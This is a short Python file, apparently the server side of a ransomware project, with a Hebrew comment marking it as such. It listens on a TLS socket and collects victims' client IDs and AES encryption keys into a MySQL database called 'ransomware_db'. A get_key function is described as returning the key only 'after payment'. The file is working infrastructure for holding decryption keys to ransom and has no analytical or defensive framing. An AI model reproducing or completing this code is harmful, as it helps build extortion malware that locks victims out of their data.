                                                                                                                                                                              -מי שעובר על הקוד שימו לב בבקשה זה צד השרת!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
import ssl
import socket
import mysql.connector

db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="password",
    database="ransomware_db"
)
cursor = db.cursor()


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('localhost', 12345))
server_socket.listen(5)

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

def save_key(client_id, key):
    """ שמירת מפתח הלקוח ב-MySQL """
    cursor.execute("INSERT INTO encryption_keys (client_id, aes_key) VALUES (%s, %s)", (client_id, key))
    db.commit()

def get_key(client_id):
    """ החזרת מפתח הצפנה ללקוח לאחר תשלום """
    cursor.execute("SELECT aes_key FROM encryption_keys WHERE client_id = %s", (client_id,))
    result = cursor.fetchone()
    return result[0] if result else None

with context.wrap_socket(server_socket, server_side=True) as ssl_server:
    print("SSL Server listening...")
    while True:
        client_socket, addr = ssl_server.accept()
        client_id = client_socket.recv(1024).decode('utf-8')
        key = client_socket.recv(1024)  
        save_key(client_id, key)
        client_socket.close()
